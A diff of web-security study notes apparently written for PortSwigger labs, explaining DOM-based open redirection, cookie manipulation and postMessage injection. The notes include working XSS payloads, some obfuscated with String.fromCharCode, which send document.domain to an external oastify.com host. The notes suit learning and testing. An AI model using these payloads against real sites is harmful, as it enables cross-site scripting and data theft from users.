@@ -328,84 +328,136 @@ The exploitation payload:
 ```html
 <iframe src=https://0ab400b604252be5803512fc002b00ad.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:alert(eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,112,99,53,100,118,116,109,104,100,97,49,122,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,85,83,69,82,69,78,68,34)))\"}","*")'>
 ```
+# DOM-Based Open Redirection
 
+Open redirections arise when scripts write attacker-controllable data into a sink that can trigger cross-domain navigation. The code may be vulnerable due to unsafe handling of `location.hash` properties:
 
+```js
+let url = /https?:\/\/.+/.exec(location.hash);
+if (url) {
+  location = url[0];
+}
+```
 
+Open redirect can be used for phishing attacks since many users don't notice the subsequent redirection to a different domain. IF attackers controls the start of the string passed to the redirection API, it may be possible to escalate into an injection attack via the `javascript:` pseudo protocol to execute code when URL is processed.
 
+Some sinks to look for include:
 
+- location
+- location.host
+- location.hostname
+- location.href
+- location.pathname
+- location.search
+- location.protocol
+- location.assign()
+- location.replace()
+- open()
+- element.srcdoc
+- XMLHttpRequest.open()
+- XMLHttpRequest.send()
+- jQuery.ajax()
+- $.ajax()
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-# DOM XSS - Open Redirection
-
-There was a client-side script on the app that is taking in a query parameter called "url" and using the value in a location.href sink. The URL needs to begin with "https://". The JavaScript pseudo-protocol will not work here because you do not have control of the beginning of the href value. This will simply redirect a user to a different website - can be used for phishing.
-
-An example:
-
-- `https://VULNERABLE-APP.net/post?postId=4&url=https://user-input`
-
-The vulnerable code:
+An example, there may be a link at the bottom of a page to go back home such as:
 
 ```html
-<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>
+<a href="#" onclick="returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : &quot;/&quot;">Back to Blog</a>
 ```
-# DOM XSS - Cookie Manipulation
 
-The "window.location" source is being appended to a Cookie using the "document.cookie". This cookie value is reflected back in the app's response within an HTML attribute. Submit a crafted URL that will break out of the HTML context and execute JavaScript code.
+It may return an onclick attribute that contains inline JavaScript. The `returnURL` variable is being assigned a value. The `/` indicates the start and end of a regular expression. The regular expressions calls `exec` which takes an argument of `location` - anything in the URL bar.
 
-An example context:
+The URL is measured against the regex to check for a match. The value of `location.href` is assigned depending on if there is a match or not via a ternary operator `?`. If `returnURL` exists (depends on a match), it sets the value of `location.href` to `returnUrl[1]`. If no match, it sets the location to `/`.
 
-- `<a href='https://VULNERABLE-APP.net/product?productId=user-input`
+It looks in the URL specifically for `url=` and then either `http://` or `https://` due to the question mark. The `.` represents any character and the `+` represents an unlimited number of characters.
 
-And the payload would be:
+It looks for `url=[URL]`. If there is a URL, there is a match and `location.href` is set to the value of the URL instead of `/`.
+
+Try submitting the required parameters such as and clicking the button to trigger the `onclick` event:
+
+```bash
+&url=https://google.com
+```
+
+To test further, running the code in the console returns two results:
 
 ```javascript
-&'><script>print()</script>
+location;
+/url=(https?:\/\/.+)/.exec(location);
 ```
 
->[!info]
->You need to use the & in the URL symbol to inject valid payload, since the app will throw an error if the "productId" is not valid.
+The left and right parentheses set up a capture group that references a specific part of the regex later. The first match may be the first item in the array (the URL parameter match) and the second item (value of the capture group being returned):
 
-The iframe will first load the vulnerable URL, which will store it in "window.location" source. Then, the onload event will redirect to another page on the app, which will trigger the JavaScript, as the URL is reflected in the response.
+```json
+[
+    "url=https://google.com",
+    "https://google.com"
+]
+```
 
-The final payload:
+The JavaScript needs to reference the URL directly which the parentheses do (defining the capture group). The second item of the array it grabs is the value of the capture group (full URL). Removing parentheses returns a single result:
+
+```json
+[
+    "url=https://google.com#"
+]
+```
+# DOM-Based Cookie Manipulation
+
+Some vulnerabilities allow attackers to manipulate data that don't control. Cookie manipulation occurs when a script writes attacker controlled data into the value of a cookie. An attacker can use it to construct a URL that can set a value in the user's cookie. 
+
+Many sinks are harmless, but DOM based cookie attacks can exploit them. If JavaScript writes data from a source into `document.cookie` without sanitization, an attacker can manipulate the value of a cookie to inject values:
+
+```js
+document.cookie = 'cookieName='+location.hash.slice(1);
+```
+
+If the site unsafely reflects values from cookies without HTML encoding them, it can be exploited.
+
+For example, there may be a product ID in the URL and an option to view the "last viewed product" on the home page which may be stored in a cookie:
 
 ```html
-<iframe src="https://VULNERABLE-APP.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://VULNERABLE-APP.net';window.x=1;">
+lastViewedProduct=https://0aa7008203d0dae081e566ca00ec00f5.web-security-academy.net/product?productId=1
 ```
 
-The vulnerable code:
+It could be set via some code:
+
+```js
+ document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
+```
+
+It sets a cookie with the value being set to `window.location` which is the URL as the product ID. It assigns the value dynamically depending on the value of the URL bar. By setting another parameter in the URL, the cookie value can be controlled by us.
+
+The cookie may be used to populate a link to the previous product, including any parameters the attacker sets:
 
 ```html
-<script>
-   document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
-</script>
+<a href="https://0aa7008203d0dae081e566ca00ec00f5.web-security-academy.net/product?productId=1">Last viewed product</a>
 ```
+
+Attackers can inject into the href attribute of an anchor tag. If so, try exiting the anchor tag by submitting a single quote, closing angle bracket and then supplying a simple XSS alert:
+
+```html
+https://0aa7008203d0dae081e566ca00ec00f5.web-security-academy.net/product?productId=1&'><script>print()</script>
+```
+
+The function may execute:
+
+```html
+<a href='https://0aa7008203d0dae081e566ca00ec00f5.web-security-academy.net/product?productId=1&'><script>print()</script>'>Last viewed product</a>
+```
+
+It closes the href attribute, closes the anchor tag and then executes the script tags. To exploit it, an iframe could be used:
+
+```html
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
+```
+
+An iframe is loaded with the source being the vulnerable URL with script tags. The value of the cookie is set with the value of the URL. The victim must navigate back to the home page to get executed. The `onload` attribute has a conditional that says if the window is not set, then`this.src` is set to the value of the home page. 
+
+The iframe source would be changed to the home page. The `window.x` is set to 1 to prevent an infinite loop.
 
 And the exploitation payload:
 
 ```html
 <iframe src="https://0ac0003e03b1155582af4721003c00da.web-security-academy.net/product?productId=1&'><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,100,101,118,49,98,116,104,49,100,112,50,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,85,83,69,82,69,78,68,34))</script>" onload="if(!window.x)this.src='https://0ac0003e03b1155582af4721003c00da.web-security-academy.net';window.x=1;">
 ```
-
